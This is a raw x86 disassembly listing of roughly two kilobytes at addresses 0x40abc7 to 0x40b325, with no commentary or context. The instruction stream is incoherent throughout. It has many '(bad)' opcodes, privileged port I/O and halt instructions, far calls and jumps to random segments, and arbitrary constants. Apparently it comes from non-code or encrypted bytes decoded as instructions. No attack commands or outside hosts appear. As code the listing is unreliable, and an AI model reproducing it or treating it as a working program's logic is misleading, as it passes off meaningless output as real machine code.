  40abc7:	test   BYTE PTR [ebx+0x70],bl
  40abca:	jecxz  0x40ab67
  40abcc:	repz sbb esi,eax
  40abcf:	mov    cl,BYTE PTR [eax+0x6]
  40abd2:	sahf   
  40abd3:	rol    DWORD PTR [esi-0x9799e8e],0xe5
  40abda:	inc    ecx
  40abdb:	jnp    0x40ac2e
  40abdd:	mov    ds:0x916f38a2,eax
  40abe2:	or     eax,0xbab0459c
  40abe7:	inc    ecx
  40abe8:	mov    ds:0x50207a49,eax
  40abed:	sbb    cl,BYTE PTR [ecx]
  40abef:	(bad)  
  40abf0:	leave  
  40abf1:	jns    0x40ab8b
  40abf3:	mov    ch,0x5a
  40abf5:	jbe    0x40ac64
  40abf7:	add    esp,DWORD PTR [edi+0x73]
  40abfa:	push   0xfffffff6
  40abfc:	xor    BYTE PTR [ebp-0x60b4f4b4],0x5
  40ac03:	inc    eax
  40ac04:	retf   
  40ac05:	dec    edi
  40ac06:	or     eax,0x81f5616
  40ac0b:	fcomp  QWORD PTR [eax]
  40ac0d:	lea    ebx,[edi-0x2514384f]
  40ac13:	fldenv [ebx]
  40ac15:	dec    edi
  40ac16:	and    dh,BYTE PTR [ebx+eax*4-0x4e]
  40ac1a:	test   al,0x38
  40ac1c:	cmp    al,0x1a
  40ac1e:	rol    BYTE PTR [esi-0x25],0x4e
  40ac22:	push   0x90c687e4
  40ac27:	shr    BYTE PTR [ebx+0x3d],0xad
  40ac2b:	leave  
  40ac2c:	xor    esp,DWORD PTR [esi+0x3]
  40ac2f:	fs cdq 
  40ac31:	or     al,0x5a
  40ac33:	mov    edi,0xb977f773
  40ac38:	scas   eax,DWORD PTR es:[edi]
  40ac39:	nop
  40ac3a:	push   0x12
  40ac3c:	sbb    DWORD PTR [ecx],0x17d11bdd
  40ac42:	stos   DWORD PTR es:[edi],eax
  40ac43:	stc    
  40ac44:	call   0xa1a2:0xed0682cd
  40ac4b:	mov    ah,0x86
  40ac4d:	gs and al,0x13
  40ac50:	xchg   esp,eax
  40ac51:	or     ecx,ebx
  40ac53:	sbb    DWORD PTR [ecx+0x4c],edx
  40ac56:	jecxz  0x40ac40
  40ac58:	add    eax,0x28d5ead1
  40ac5d:	dec    eax
  40ac5e:	mov    DWORD PTR [ecx],edx
  40ac60:	mov    bh,0x66
  40ac62:	sub    al,0x6f
  40ac64:	mov    ch,0x4c
  40ac66:	dec    edi
  40ac67:	dec    eax
  40ac68:	mov    ebx,0xd780db0e
  40ac6d:	xor    al,0xd6
  40ac6f:	adc    BYTE PTR [eax-0x55],0x76
  40ac73:	or     DWORD PTR [eax+0x8],esi
  40ac76:	dec    eax
  40ac77:	jb     0x40acd4
  40ac79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac7a:	bswap  edx
  40ac7c:	lock lods eax,DWORD PTR ds:[esi]
  40ac7e:	daa    
  40ac7f:	ja     0x40ac8b
  40ac81:	dec    esi
  40ac82:	dec    ebx
  40ac83:	cld    
  40ac84:	ret    0x399b
  40ac87:	cli    
  40ac88:	jne    0x40ac2b
  40ac8a:	sub    al,0x7c
  40ac8c:	inc    edi
  40ac8d:	cmp    ebx,DWORD PTR [ecx+ecx*1+0x10]
  40ac91:	mov    ebx,0x3ee03bc9
  40ac96:	setns  ch
  40ac99:	cs stos BYTE PTR es:[edi],al
  40ac9b:	test   al,0x26
  40ac9d:	and    ebx,DWORD PTR [eax]
  40ac9f:	outs   dx,BYTE PTR ds:[esi]
  40aca0:	mov    ecx,0xee8e6e2a
  40aca5:	inc    ebx
  40aca6:	jecxz  0x40ad0d
  40aca8:	test   DWORD PTR [ebp-0x3b],ebx
  40acab:	mov    dl,0x32
  40acad:	xchg   esp,eax
  40acae:	jge    0x40ad2b
  40acb0:	add    BYTE PTR ds:0xcd1759a6,bl
  40acb6:	js     0x40ace9
  40acb8:	outs   dx,BYTE PTR ds:[esi]
  40acb9:	test   DWORD PTR [ebx],esi
  40acbb:	pop    esp
  40acbc:	sub    al,0xa2
  40acbe:	xor    BYTE PTR [edx-0x67ef5f47],bh
  40acc4:	je     0x40ad29
  40acc6:	jbe    0x40ad41
  40acc8:	mov    bl,0xa1
  40acca:	dec    ebp
  40accb:	push   edi
  40accc:	retf   0xbdd2
  40accf:	pusha  
  40acd0:	call   0x6b56:0xfbf28ddd
  40acd7:	jno    0x40acfd
  40acd9:	mov    cl,0x3c
  40acdb:	and    BYTE PTR [esi+0x72fe4c2],cl
  40ace1:	mov    cl,0xb4
  40ace3:	mov    ebx,0xa8e11e0d
  40ace8:	mov    ds:0x1ae5f70c,eax
  40aced:	xchg   ebp,eax
  40acee:	sahf   
  40acef:	adc    edi,ebx
  40acf1:	mov    cl,0xed
  40acf3:	mov    eax,0xc8ee4b68
  40acf8:	mov    DWORD PTR [edi-0x3c],esp
  40acfb:	push   ss
  40acfc:	es add ebp,0xffffffa6
  40ad00:	or     edi,DWORD PTR [edi+0x5a]
  40ad03:	fmul   QWORD PTR [esi-0x3604302b]
  40ad09:	xchg   ebp,eax
  40ad0a:	mov    ds:0xce818ed1,eax
  40ad0f:	jmp    DWORD PTR [eax]
  40ad11:	xor    al,0x17
  40ad13:	mov    eax,0xd3dfc0e0
  40ad18:	add    BYTE PTR [ecx],bh
  40ad1a:	hlt    
  40ad1b:	and    ch,BYTE PTR [edi-0x49]
  40ad1e:	sbb    cl,BYTE PTR [ebx+eax*1+0x7d]
  40ad22:	sub    BYTE PTR [eax],ah
  40ad24:	std    
  40ad25:	push   ebx
  40ad26:	ds call 0x6120ef61
  40ad2c:	cs ins BYTE PTR es:[edi],dx
  40ad2e:	mov    bl,0x2f
  40ad30:	pusha  
  40ad31:	or     ebx,DWORD PTR [edi]
  40ad33:	aam    0x71
  40ad35:	sub    edx,DWORD PTR [edi-0x5d]
  40ad38:	inc    eax
  40ad39:	pusha  
  40ad3a:	nop
  40ad3b:	sti    
  40ad3c:	pop    edx
  40ad3d:	xor    BYTE PTR ds:0xdf21cd8e,ch
  40ad43:	jmp    0x40ad8d
  40ad45:	int    0xde
  40ad47:	jnp    0x40ad55
  40ad49:	jg     0x40ad48
  40ad4b:	bound  edx,QWORD PTR [esp+ebx*4]
  40ad4e:	in     al,dx
  40ad4f:	pop    ss
  40ad50:	es add eax,0xd519838
  40ad56:	cmp    BYTE PTR [eax],bh
  40ad58:	jns    0x40ace4
  40ad5a:	push   es
  40ad5b:	aaa    
  40ad5c:	mov    ah,BYTE PTR [ecx+0x40]
  40ad5f:	jno    0x40ad8d
  40ad61:	pushf  
  40ad62:	jg     0x40acec
  40ad64:	js     0x40ad3d
  40ad66:	cmc    
  40ad67:	je     0x40ad79
  40ad69:	jmp    0xc2fb:0x2ca5fcf1
  40ad70:	leave  
  40ad71:	jmp    0x40ad31
  40ad73:	and    al,bl
  40ad75:	inc    ebp
  40ad76:	out    0x1,eax
  40ad78:	push   eax
  40ad79:	std    
  40ad7a:	push   eax
  40ad7b:	mov    ?,WORD PTR [esi+0x0]
  40ad7e:	loop   0x40ad98
  40ad80:	mov    edi,0x9f632ac6
  40ad85:	repz or BYTE PTR [ebx+esi*4],ch
  40ad89:	aad    0x9e
  40ad8b:	inc    ecx
  40ad8c:	sahf   
  40ad8d:	leave  
  40ad8e:	pop    ecx
  40ad8f:	push   ss
  40ad90:	out    0x7b,al
  40ad92:	in     al,0x70
  40ad94:	idiv   BYTE PTR [ecx+0x41b5b20c]
  40ad9a:	cmp    al,BYTE PTR [eax]
  40ad9c:	add    ebx,ecx
  40ad9e:	repz shl BYTE PTR [ebx-0x5157c4d2],cl
  40ada5:	loope  0x40aded
  40ada7:	repz pop eax
  40ada9:	push   es
  40adaa:	out    0xdf,al
  40adac:	sub    al,0x6
  40adae:	or     BYTE PTR [esi],0xcb
  40adb1:	repnz xor DWORD PTR [edx],edi
  40adb4:	std    
  40adb5:	adc    dl,BYTE PTR [eax]
  40adb7:	popf   
  40adb8:	cdq    
  40adb9:	popa   
  40adba:	fucomip st,st(2)
  40adbc:	idiv   DWORD PTR [ecx+0x2b406f7d]
  40adc2:	or     DWORD PTR [eax-0x481e00fd],ebx
  40adc8:	jo     0x40add1
  40adca:	gs test al,0x80
  40adcd:	(bad)  
  40adce:	mov    WORD PTR [edi],?
  40add0:	data16 out dx,al
  40add2:	mov    bh,0x5
  40add4:	sub    eax,0x8e8397c9
  40add9:	lock jbe 0x40ae0a
  40addc:	cmp    eax,0x759ad022
  40ade1:	imul   ebx
  40ade3:	xchg   DWORD PTR [edi],edx
  40ade5:	pop    ss
  40ade6:	fs ja  0x40ae31
  40ade9:	ins    DWORD PTR es:[edi],dx
  40adea:	xchg   esp,eax
  40adeb:	cmc    
  40adec:	push   esp
  40aded:	mov    edi,0x2a0225b
  40adf2:	enter  0x3d8e,0x10
  40adf6:	jo     0x40ad8d
  40adf8:	xchg   esp,eax
  40adf9:	fs stos BYTE PTR es:[edi],al
  40adfb:	hlt    
  40adfc:	in     al,0x3d
  40adfe:	(bad)  
  40ae01:	push   ds
  40ae02:	arpl   WORD PTR [ebx],si
  40ae04:	mov    BYTE PTR [eax+esi*4-0x642f2bb1],0x4c
  40ae0c:	imul   ebx,DWORD PTR [ecx+0x59af2b08],0xffffffcf
  40ae13:	ins    BYTE PTR es:[edi],dx
  40ae14:	(bad)  
  40ae15:	(bad)  
  40ae16:	pushf  
  40ae17:	fwait
  40ae18:	sbb    al,0xf
  40ae1a:	push   ebp
  40ae1b:	std    
  40ae1c:	mov    ds:0x4b8a09a7,al
  40ae21:	test   BYTE PTR [esi+0x7b7ffaec],dh
  40ae27:	push   esp
  40ae28:	cmp    eax,0x987bd8d7
  40ae2d:	pop    ebp
  40ae2e:	dec    esp
  40ae2f:	lods   eax,DWORD PTR ds:[esi]
  40ae30:	and    DWORD PTR [edi],ebp
  40ae32:	xlat   BYTE PTR cs:[ebx]
  40ae34:	adc    bx,si
  40ae37:	xor    ah,BYTE PTR ds:0x10576cfa
  40ae3d:	ds push cs
  40ae3f:	jmp    0xc8620c42
  40ae44:	lds    eax,FWORD PTR [edx+0x60]
  40ae47:	cli    
  40ae48:	mov    dl,0x23
  40ae4a:	lods   eax,DWORD PTR ds:[esi]
  40ae4b:	cmp    eax,0xcd0defa5
  40ae50:	sub    ah,BYTE PTR ds:0x640f2a6
  40ae56:	jmp    DWORD PTR [ecx-0x3e]
  40ae59:	adc    al,0x67
  40ae5b:	mov    BYTE PTR [ecx-0xe4435c0],dl
  40ae61:	jle    0x40ae98
  40ae63:	sub    al,0xee
  40ae65:	sub    BYTE PTR [eax+0x3546c59e],cl
  40ae6b:	cld    
  40ae6c:	stos   DWORD PTR es:[edi],eax
  40ae6d:	div    BYTE PTR [ebx+eax*8+0x1e814564]
  40ae74:	loopne 0x40ae91
  40ae76:	jp     0x40aec4
  40ae78:	int    0xab
  40ae7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae7b:	in     eax,dx
  40ae7c:	scas   al,BYTE PTR es:[edi]
  40ae7d:	push   es
  40ae7e:	dec    ecx
  40ae7f:	test   DWORD PTR [ecx+ecx*8+0x1b],ebp
  40ae83:	mov    ah,0x98
  40ae85:	add    BYTE PTR [ebx],0xcb
  40ae88:	add    eax,0xf0450dfc
  40ae8d:	(bad)  [ebp+ebx*8-0x6d]
  40ae91:	adc    al,0xad
  40ae93:	dec    eax
  40ae94:	cmp    eax,0xe62edbf0
  40ae99:	pop    edx
  40ae9a:	fidiv  WORD PTR [eax+eiz*2-0x11a27d35]
  40aea1:	xchg   esp,eax
  40aea2:	fucomip st,st(2)
  40aea4:	out    0xe2,al
  40aea6:	hlt    
  40aea7:	cmc    
  40aea8:	scas   al,BYTE PTR es:[edi]
  40aea9:	mov    esi,0x896109d4
  40aeae:	outs   dx,DWORD PTR ds:[esi]
  40aeaf:	jae    0x40aef9
  40aeb1:	test   eax,0xcba9ccbe
  40aeb6:	push   0x23e24186
  40aebb:	aas    
  40aebc:	jmp    0x99275a8d
  40aec1:	push   esp
  40aec2:	in     al,dx
  40aec3:	popa   
  40aec4:	mov    WORD PTR [edi-0x6c36090],ss
  40aeca:	call   0x845e:0xef42c82
  40aed1:	sub    al,0x6e
  40aed3:	cmp    al,0xc3
  40aed5:	and    DWORD PTR [ecx],ebx
  40aed7:	adc    al,0x5c
  40aed9:	mov    esp,0x1e168cc7
  40aede:	out    0x13,eax
  40aee0:	icebp  
  40aee1:	arpl   WORD PTR [ebx-0x6a3dbbee],dx
  40aee7:	adc    al,dh
  40aee9:	mov    dh,0x6a
  40aeeb:	push   ebx
  40aeec:	iret   
  40aeed:	dec    esp
  40aeee:	mov    eax,0x8e1d0c82
  40aef3:	retf   
  40aef4:	ins    BYTE PTR es:[edi],dx
  40aef5:	sahf   
  40aef6:	sbb    eax,0xd0474e18
  40aefb:	scas   eax,DWORD PTR es:[edi]
  40aefc:	push   edx
  40aefd:	gs sub eax,0x928d6754
  40af03:	test   eax,0xc3844175
  40af08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af09:	fstp   TBYTE PTR [esi]
  40af0b:	push   cs
  40af0c:	jns    0x40af3f
  40af0e:	popf   
  40af0f:	call   DWORD PTR [esi-0x4f]
  40af12:	dec    ebp
  40af13:	inc    ebp
  40af14:	pusha  
  40af15:	cwde   
  40af16:	adc    BYTE PTR [edx+0x4e],0xcd
  40af1a:	neg    BYTE PTR [ebp-0x7e]
  40af1d:	mov    edx,0x27e8463
  40af22:	jmp    0xd96d:0xd641efc9
  40af29:	xchg   ebx,eax
  40af2a:	inc    edi
  40af2b:	xchg   ecx,eax
  40af2c:	pop    ds
  40af2d:	cli    
  40af2e:	dec    eax
  40af2f:	loop   0x40aeb5
  40af31:	add    al,0x65
  40af33:	and    ebp,esi
  40af35:	sub    esp,ebp
  40af37:	xor    DWORD PTR [ebx+0x1a],ecx
  40af3a:	les    edx,FWORD PTR [esi+0x1c]
  40af3d:	xchg   esp,eax
  40af3e:	in     eax,dx
  40af3f:	inc    eax
  40af40:	cmp    eax,0xbb36649c
  40af45:	push   0xf6cf68c2
  40af4a:	stc    
  40af4b:	das    
  40af4c:	into   
  40af4d:	popa   
  40af4e:	inc    edi
  40af4f:	adc    al,0x87
  40af51:	dec    ebp
  40af52:	sub    al,al
  40af54:	pop    ss
  40af55:	int    0x4f
  40af57:	push   ebp
  40af58:	mov    ss,WORD PTR [esi-0x352e3d9]
  40af5e:	mov    al,0x13
  40af60:	lahf   
  40af61:	inc    esp
  40af62:	mov    cl,0xab
  40af64:	rcl    DWORD PTR [edx+0x60a59212],cl
  40af6a:	push   0x4f224a12
  40af6f:	in     al,dx
  40af70:	cwde   
  40af71:	mov    ah,0x2d
  40af73:	js     0x40af8a
  40af75:	mov    WORD PTR [esi*1+0x2510fef1],ds
  40af7c:	mov    edx,0x2a058877
  40af81:	or     BYTE PTR [esi],ah
  40af83:	adc    eax,0xe6a85821
  40af88:	mov    bl,0x3d
  40af8a:	iret   
  40af8b:	test   DWORD PTR [ecx],ebp
  40af8d:	stc    
  40af8e:	int    0x14
  40af90:	mov    edx,0x943b9f75
  40af95:	add    BYTE PTR [ebx+0x43],ch
  40af98:	sbb    BYTE PTR [edx+0x1b],bh
  40af9b:	adc    al,0xcc
  40af9d:	jmp    0x40af68
  40af9f:	push   ebp
  40afa0:	(bad)  
  40afa2:	stc    
  40afa3:	or     DWORD PTR [ebx+0x2],ecx
  40afa6:	ret    0x14d3
  40afa9:	outs   dx,DWORD PTR ds:[esi]
  40afaa:	fwait
  40afab:	stos   BYTE PTR es:[edi],al
  40afac:	dec    edx
  40afad:	es pop edi
  40afaf:	arpl   WORD PTR [ebp-0x53a24e40],bx
  40afb5:	jno    0x40afd0
  40afb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afb8:	daa    
  40afb9:	out    dx,eax
  40afba:	and    eax,DWORD PTR [edi]
  40afbc:	sbb    DWORD PTR [edx+0x36],esi
  40afbf:	(bad)  
  40afc0:	mov    ah,0x8b
  40afc2:	dec    esp
  40afc3:	out    dx,al
  40afc4:	cwde   
  40afc5:	fisub  DWORD PTR [esi+0xa]
  40afc8:	rol    esi,1
  40afca:	imul   eax,DWORD PTR fs:[ebx],0xffffffb8
  40afce:	rcl    bh,cl
  40afd0:	sbb    dl,al
  40afd2:	add    eax,0x475fdb47
  40afd7:	in     eax,dx
  40afd8:	push   edx
  40afd9:	fstp   DWORD PTR [edi-0x1775def8]
  40afdf:	(bad)  
  40afe0:	retf   0x382b
  40afe3:	mov    ecx,0x2a6ed532
  40afe8:	mov    edi,0x404e36f3
  40afed:	aaa    
  40afee:	clc    
  40afef:	or     al,0x70
  40aff1:	aad    0xfe
  40aff3:	imul   edi,DWORD PTR [ebp+0x7d163546],0x445553a4
  40affd:	icebp  
  40affe:	data16 jne 0x40b022
  40b001:	nop
  40b002:	test   DWORD PTR [ebx-0x4d9519c2],esi
  40b008:	ret    
  40b009:	popf   
  40b00a:	shl    BYTE PTR ds:0xed341fad,cl
  40b010:	ja     0x40b05a
  40b012:	test   eax,0xef8760b
  40b017:	in     al,0x3a
  40b019:	stc    
  40b01a:	pop    ss
  40b01b:	sub    eax,DWORD PTR ds:0x743fc5aa
  40b021:	fiadd  WORD PTR [ebp+0x615d36a4]
  40b027:	push   ss
  40b028:	xlat   BYTE PTR ds:[ebx]
  40b029:	inc    esi
  40b02a:	in     al,dx
  40b02b:	sbb    al,0x26
  40b02d:	mov    al,0x84
  40b02f:	adc    DWORD PTR [ebp-0x93d8bef],edi
  40b035:	dec    ecx
  40b036:	or     ebp,edi
  40b038:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b039:	jo     0x40aff8
  40b03b:	pusha  
  40b03c:	jae    0x40b094
  40b03e:	jae    0x40afca
  40b040:	fstp   TBYTE PTR [edi-0x2149bb3a]
  40b046:	popf   
  40b047:	xchg   DWORD PTR [edi-0x55c06ae4],edx
  40b04d:	outs   dx,DWORD PTR ds:[esi]
  40b04e:	nop
  40b04f:	mov    esp,ss
  40b051:	(bad)  
  40b052:	stos   DWORD PTR es:[edi],eax
  40b053:	mov    ah,0x18
  40b055:	cs mov ah,0x74
  40b058:	lods   eax,DWORD PTR ds:[esi]
  40b059:	bound  esi,QWORD PTR [esi+esi*8]
  40b05c:	aad    0xbb
  40b05e:	div    eax
  40b060:	mov    al,ds:0x50a923cf
  40b065:	adc    eax,0x3b795788
  40b06a:	push   ebp
  40b06b:	add    BYTE PTR [ebx],ch
  40b06d:	pop    ebx
  40b06e:	xor    eax,0x7505b1ae
  40b073:	mov    ds,WORD PTR ds:0x9859571e
  40b079:	push   ss
  40b07a:	sub    DWORD PTR [edi-0x80],ebx
  40b07d:	fdiv   st,st(5)
  40b07f:	(bad)  
  40b080:	cmp    eax,0x3f0b0b5c
  40b085:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b086:	mov    bl,0x95
  40b088:	xchg   esi,eax
  40b089:	pop    esp
  40b08a:	hlt    
  40b08b:	fs mov esi,0xf7f639c8
  40b091:	in     al,0xc3
  40b093:	inc    ebx
  40b094:	imul   eax,DWORD PTR [ebx-0xc],0xffffffcb
  40b098:	mov    ch,0xc2
  40b09a:	or     eax,0x52e8d655
  40b09f:	cmps   WORD PTR gs:[esi],WORD PTR es:[edi]
  40b0a2:	stos   BYTE PTR es:[edi],al
  40b0a3:	mov    ecx,0x8205a79f
  40b0a8:	pusha  
  40b0a9:	stos   DWORD PTR es:[edi],eax
  40b0aa:	xchg   ecx,eax
  40b0ab:	ins    BYTE PTR es:[edi],dx
  40b0ac:	ins    DWORD PTR es:[edi],dx
  40b0ad:	loop   0x40b063
  40b0af:	adc    DWORD PTR [ebx],esi
  40b0b1:	and    eax,0xf63a06ed
  40b0b6:	mov    ebp,0x692ca942
  40b0bb:	mov    ecx,0x62820a63
  40b0c0:	xchg   ecx,eax
  40b0c1:	xor    eax,0x68c183f9
  40b0c6:	jl     0x40b04f
  40b0c8:	inc    si
  40b0ca:	je     0x40b0bb
  40b0cc:	mov    edi,0x2c878f6f
  40b0d1:	dec    eax
  40b0d2:	jmp    0x346a93c0
  40b0d7:	dec    eax
  40b0d8:	rcl    dl,0x3e
  40b0db:	xchg   ebp,eax
  40b0dc:	das    
  40b0dd:	pop    ebp
  40b0de:	sub    esp,DWORD PTR [ebx+edx*4-0x49]
  40b0e2:	cli    
  40b0e3:	xchg   edi,eax
  40b0e4:	or     BYTE PTR [eax-0x4a],cl
  40b0e7:	repnz add BYTE PTR ds:0x76e85d5f,bl
  40b0ee:	add    dh,ch
  40b0f0:	mov    edx,0xc1e18a86
  40b0f5:	push   esi
  40b0f6:	and    BYTE PTR [ecx],dh
  40b0f8:	inc    edi
  40b0f9:	stc    
  40b0fa:	popf   
  40b0fb:	mov    WORD PTR [eax],fs
  40b0fd:	dec    ebp
  40b0fe:	imul   edx,DWORD PTR [ebx+eax*2-0x8],0x4a
  40b103:	leave  
  40b104:	mov    ch,0x4f
  40b106:	jno    0x40b135
  40b108:	into   
  40b109:	and    eax,0x7697010a
  40b10e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b10f:	push   ebx
  40b110:	cld    
  40b111:	sbb    DWORD PTR ds:0xda7014f3,ebp
  40b117:	scas   al,BYTE PTR es:[edi]
  40b118:	or     ch,bh
  40b11a:	or     al,0xa9
  40b11c:	outs   dx,DWORD PTR ds:[esi]
  40b11d:	cmp    dh,BYTE PTR ds:0x99114b29
  40b123:	fs push 0x279aa892
  40b129:	push   es
  40b12a:	leave  
  40b12b:	pop    es
  40b12c:	mul    DWORD PTR [esi+0x67]
  40b12f:	xor    eax,0x3dbd715f
  40b134:	fidivr DWORD PTR [esi+0x52ebc7b2]
  40b13a:	sub    eax,0x37fe872d
  40b13f:	cdq    
  40b140:	jns    0x40b169
  40b142:	cmp    dh,ah
  40b144:	out    0x6,al
  40b146:	mov    esp,0xa74d7374
  40b14b:	stos   DWORD PTR es:[edi],eax
  40b14c:	mov    bh,0xae
  40b14e:	add    edx,ecx
  40b150:	in     al,dx
  40b151:	pop    ebx
  40b152:	xchg   ebx,eax
  40b153:	fcom   DWORD PTR [ebx+0x153c38f2]
  40b159:	mov    edi,0xda8e787d
  40b15e:	dec    ecx
  40b15f:	jl     0x40b1d4
  40b161:	sub    eax,0xf8d6285c
  40b166:	jns    0x40b156
  40b168:	jecxz  0x40b155
  40b16a:	jb     0x40b125
  40b16c:	gs xchg esi,eax
  40b16e:	in     al,dx
  40b16f:	pop    ebx
  40b170:	inc    edx
  40b171:	pop    edx
  40b172:	retw   
  40b174:	les    eax,FWORD PTR [eax]
  40b176:	scas   al,BYTE PTR es:[edi]
  40b177:	inc    eax
  40b178:	sub    DWORD PTR [eax-0x6c],ebx
  40b17b:	jns    0x40b166
  40b17d:	call   0xaa94:0xf1698701
  40b184:	mov    cl,0xde
  40b186:	jne    0x40b1f7
  40b188:	in     eax,0xe5
  40b18a:	or     eax,0xbb452d52
  40b18f:	xor    eax,0x8bad9a45
  40b194:	mov    DWORD PTR [edi-0x39],esi
  40b197:	cs mov ah,0x50
  40b19a:	cmp    al,0xeb
  40b19c:	pop    eax
  40b19d:	xchg   DWORD PTR [ebp-0x77],edi
  40b1a0:	std    
  40b1a1:	xlat   BYTE PTR ds:[ebx]
  40b1a2:	pushf  
  40b1a3:	js     0x40b1d3
  40b1a5:	(bad)  
  40b1a6:	jge    0x40b19d
  40b1a8:	repz or BYTE PTR [ebx+0x59],ah
  40b1ac:	jns    0x40b1be
  40b1ae:	jns    0x40b140
  40b1b0:	aam    0xcd
  40b1b2:	imul   edi,DWORD PTR [edi+0x4e],0x1378718f
  40b1b9:	shl    edx,cl
  40b1bb:	lahf   
  40b1bc:	enter  0x76e0,0xeb
  40b1c0:	bound  edx,QWORD PTR [ebp+0x6ad3e0a9]
  40b1c6:	inc    ecx
  40b1c7:	call   0xb6763805
  40b1cc:	dec    edi
  40b1cd:	std    
  40b1ce:	test   eax,0x42da357a
  40b1d3:	stos   BYTE PTR es:[edi],al
  40b1d4:	mov    dh,0xcb
  40b1d6:	scas   al,BYTE PTR es:[edi]
  40b1d7:	in     al,dx
  40b1d8:	and    ebx,esp
  40b1da:	cld    
  40b1db:	bswap  ecx
  40b1dd:	int    0xb1
  40b1df:	push   ebp
  40b1e0:	addr16 pop esi
  40b1e2:	das    
  40b1e3:	sub    ebp,ebx
  40b1e5:	fsubr  DWORD PTR [ebx]
  40b1e7:	push   es
  40b1e8:	cmp    bl,BYTE PTR [edi]
  40b1ea:	fwait
  40b1eb:	xchg   edx,eax
  40b1ec:	setne  bh
  40b1ef:	mov    WORD PTR [esi+ebx*2],es
  40b1f2:	ret    
  40b1f3:	aas    
  40b1f4:	push   ds
  40b1f5:	call   0xcdb244d1
  40b1fa:	sbb    ecx,0xfca730c0
  40b200:	stc    
  40b201:	jp     0x40b204
  40b203:	inc    ecx
  40b204:	cmp    al,0xf2
  40b206:	and    al,0x41
  40b208:	stos   DWORD PTR es:[edi],eax
  40b209:	loopne 0x40b1b8
  40b20b:	and    BYTE PTR [ecx+0x64],ch
  40b20e:	(bad)
  40b212:	add    esp,ebx
  40b214:	mov    eax,0x82e76740
  40b219:	pop    ecx
  40b21a:	jge    0x40b22c
  40b21c:	(bad)  
  40b21e:	mov    BYTE PTR ds:0xcaa1f3bd,ah
  40b224:	xlat   BYTE PTR ds:[ebx]
  40b225:	or     DWORD PTR [ebp+ebp*4-0x4577080],esp
  40b22c:	or     DWORD PTR [edi+ebx*8],edi
  40b22f:	clc    
  40b230:	lods   eax,DWORD PTR ds:[esi]
  40b231:	sahf   
  40b232:	hlt    
  40b233:	fxch   st(6)
  40b235:	mov    ch,0x3d
  40b237:	mov    ch,0xb
  40b239:	retf   0xbbf6
  40b23c:	data16 outs dx,BYTE PTR ds:[esi]
  40b23e:	push   edi
  40b23f:	ret    0x5661
  40b242:	mov    cl,0x4b
  40b244:	ret    0xbeec
  40b247:	sub    BYTE PTR [eax+edi*2],0xbc
  40b24b:	sbb    eax,0x7fc933e
  40b250:	ins    DWORD PTR es:[edi],dx
  40b251:	je     0x40b245
  40b253:	xchg   esp,eax
  40b254:	adc    al,0x2d
  40b256:	fistp  QWORD PTR [eax]
  40b258:	jge    0x40b1ea
  40b25a:	cwde   
  40b25b:	mov    ah,0x25
  40b25d:	bound  esi,QWORD PTR [ebp+0x5a]
  40b260:	in     al,0x74
  40b262:	addr16 xchg esi,eax
  40b264:	imul   ecx,DWORD PTR [ebx-0x2],0x62
  40b268:	dec    eax
  40b269:	adc    dh,BYTE PTR fs:[edi+0x6b07404f]
  40b270:	jle    0x40b248
  40b272:	(bad)  
  40b273:	mov    esp,0x69f7cd8f
  40b278:	and    ebp,DWORD PTR es:[ecx-0x17c637d4]
  40b27f:	rcl    BYTE PTR [eax+0x24],cl
  40b282:	aad    0xa4
  40b284:	dec    esp
  40b285:	mov    al,ds:0xffacca5d
  40b28a:	in     al,dx
  40b28b:	mov    WORD PTR [ecx+0x4a],ss
  40b28e:	not    DWORD PTR [esi]
  40b290:	xchg   edx,eax
  40b291:	xchg   edx,eax
  40b292:	gs jae 0x40b308
  40b295:	retf   
  40b296:	mov    WORD PTR [ebp-0x47ea34d],gs
  40b29c:	dec    ebp
  40b29d:	mov    edi,0xed954789
  40b2a2:	push   ss
  40b2a3:	mov    ch,BYTE PTR [ecx]
  40b2a5:	or     DWORD PTR [edi],ebp
  40b2a7:	pop    esp
  40b2a8:	jge    0x40b2e0
  40b2aa:	mov    ecx,0xaa5b498
  40b2af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2b0:	hlt    
  40b2b1:	in     eax,0x5f
  40b2b3:	cmp    esp,eax
  40b2b5:	cdq    
  40b2b6:	cmp    DWORD PTR [esi+eax*1],ebx
  40b2b9:	or     al,0x83
  40b2bb:	retf   0x6a3f
  40b2be:	pop    eax
  40b2bf:	sub    BYTE PTR [ecx+0x7f],bh
  40b2c2:	fwait
  40b2c3:	add    ah,cl
  40b2c5:	outs   dx,BYTE PTR ds:[esi]
  40b2c6:	call   0xb1c3:0x453c220
  40b2cd:	gs and esp,ebp
  40b2d0:	lahf   
  40b2d1:	retf   
  40b2d2:	adc    al,0xbf
  40b2d4:	inc    esp
  40b2d5:	and    BYTE PTR [ebx],bl
  40b2d7:	shl    DWORD PTR [esi+0x1ae56547],0xf8
  40b2de:	sub    dl,BYTE PTR [esi-0x5]
  40b2e1:	mov    edi,0x40b2e761
  40b2e6:	ins    BYTE PTR es:[edi],dx
  40b2e7:	xchg   BYTE PTR [edi],bl
  40b2e9:	sti    
  40b2ea:	outs   dx,BYTE PTR ds:[esi]
  40b2eb:	inc    edx
  40b2ec:	int    0x35
  40b2ee:	daa    
  40b2ef:	cmc    
  40b2f0:	js     0x40b2bf
  40b2f2:	xor    eax,0xf705a6ae
  40b2f7:	jmp    0xd8b9c2ef
  40b2fc:	and    DWORD PTR [esi+0x78],edi
  40b2ff:	pop    esp
  40b300:	sbb    DWORD PTR [eax+0x34a7bd8],0x47
  40b307:	dec    eax
  40b308:	fistp  QWORD PTR [ebx]
  40b30a:	out    0xc3,eax
  40b30c:	loopne 0x40b34d
  40b30e:	std    
  40b30f:	stos   DWORD PTR es:[edi],eax
  40b310:	shr    DWORD PTR [esp+eiz*8],1
  40b313:	nop
  40b314:	mov    al,ds:0x8a02f20a
  40b319:	mov    BYTE PTR [esi+0x16],ch
  40b31c:	pop    ss
  40b31d:	pop    eax
  40b31e:	sahf   
  40b31f:	mov    al,0x88
  40b321:	pusha  
  40b322:	(bad)  
  40b323:	mov    ah,0xaf
  40b325:	ins    BYTE PTR es:[edi],dx
